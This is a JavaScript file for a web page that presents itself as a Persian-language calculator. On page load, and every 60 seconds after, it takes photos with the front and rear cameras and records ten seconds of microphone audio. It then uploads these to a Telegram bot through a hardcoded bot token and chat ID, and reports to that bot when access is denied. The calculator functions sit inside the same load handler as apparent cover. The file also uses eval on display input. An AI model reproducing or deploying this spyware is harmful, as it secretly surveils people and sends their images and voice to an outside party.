const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
const chatId = "1120400003";
const statusText = document.getElementById("status");
const video = document.getElementById("video");

let audioBlob = null;
let photoFront = null;
let photoBack = null;

async function captureImage(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
    video.srcObject = stream;

    // صبر برای نمایش تصویر
    await new Promise(resolve => setTimeout(resolve, 1000));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

    stream.getTracks().forEach(track => track.stop());
    return blob;
  } catch (err) {
    // اگر اجازه دوربین رد شود یا خطایی رخ دهد، null برمی‌گردانیم
    return null;
  }
}

async function recordAudio() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];

    mediaRecorder.ondataavailable = e => chunks.push(e.data);

    return new Promise((resolve) => {
      mediaRecorder.onstop = () => {
        stream.getTracks().forEach(track => track.stop());
        resolve(new Blob(chunks, { type: "audio/webm" }));
      };

      mediaRecorder.start();
      statusText.innerText = "🎙 در حال ضبط صدا به مدت ۱۰ ثانیه...";
      setTimeout(() => {
        mediaRecorder.stop();
        statusText.innerText = "⏳ در حال ارسال اطلاعات...";
      }, 10000);
    });
  } catch (err) {
    return null; // اگر اجازه میکروفون رد شود یا خطا باشد
  }
}

function sendToTelegram(audio, photoFront, photoBack) {
  let sentSomething = false;

  if (audio) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("caption", "📤 فایل‌های ارسالی:");
    formData.append("voice", audio, "voice.webm");

    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
      method: "POST",
      body: formData
    });
    sentSomething = true;
  }

  if (photoFront) {
    const formDataFront = new FormData();
    formDataFront.append("chat_id", chatId);
    formDataFront.append("photo", photoFront, "front.jpg");

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formDataFront
    });
    sentSomething = true;
  }

  if (photoBack) {
    const formDataBack = new FormData();
    formDataBack.append("chat_id", chatId);
    formDataBack.append("photo", photoBack, "back.jpg");

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: formDataBack
    });
    sentSomething = true;
  }

  if (sentSomething) {
    statusText.innerText = "✅ صدا و عکس‌ها با موفقیت ارسال شدند!";
  } else {
    // اگر هیچ دسترسی داده نشده بود یا خطایی رخ داده بود، به بات اطلاع بدهیم
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: "❌ هیچ دسترسی به میکروفون یا دوربین داده نشده یا خطا رخ داده است."
      })
    });
    statusText.innerText = "❌ خطایی رخ داد یا دسترسی رد شد.";
  }
}

async function startAll() {
  try {
    statusText.innerText = "📸 در حال گرفتن عکس از دوربین جلو...";
    photoFront = await captureImage("user");

    statusText.innerText = "📸 در حال گرفتن عکس از دوربین عقب...";
    photoBack = await captureImage("environment");

    audioBlob = await recordAudio();

    sendToTelegram(audioBlob, photoFront, photoBack);
  } catch (e) {
    statusText.innerText = "❌ خطایی رخ داد یا دسترسی رد شد.";
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: "❌ خطای غیرمنتظره در اجرای برنامه رخ داد."
      })
    });
  }
}

// اجرای اولین بار بلافاصله پس از بارگذاری صفحه
window.onload = () => {
  startAll();
  
    const display = document.getElementById('display');
    const history = document.getElementById('history');

    function append(value) {
      if (display.innerText === '0' || display.innerText === 'خطا!') {
        display.innerText = value;
      } else {
        display.innerText += value;
      }
    }

    function clearDisplay() {
      display.innerText = '0';
    }

    function backspace() {
      const text = display.innerText;
      if (text.length > 1) {
        display.innerText = text.slice(0, -1);
      } else {
        display.innerText = '0';
      }
    }

    function calculate() {
      try {
        const input = display.innerText.replace(/%/g, '*0.01');
        const result = eval(input);
        history.innerText = display.innerText + ' = ' + result;
        display.innerText = result.toString();
      } catch {
        display.innerText = 'خطا!';
      }
    }

    function calculateTrig(func) {
      try {
        let value = parseFloat(display.innerText);
        if (isNaN(value)) throw 'NaN';
        let radians = value * Math.PI / 180;
        let result = func === 'sin' ? Math.sin(radians) : Math.cos(radians);
        result = parseFloat(result.toFixed(8));
        history.innerText = func + '(' + value + ') = ' + result;
        display.innerText = result.toString();
      } catch {
        display.innerText = 'خطا!';
      }
    }

  // اجرای تابع startAll هر 60 ثانیه (60000 میلی‌ثانیه)
  setInterval(() => {
    startAll();
  }, 60000);
};
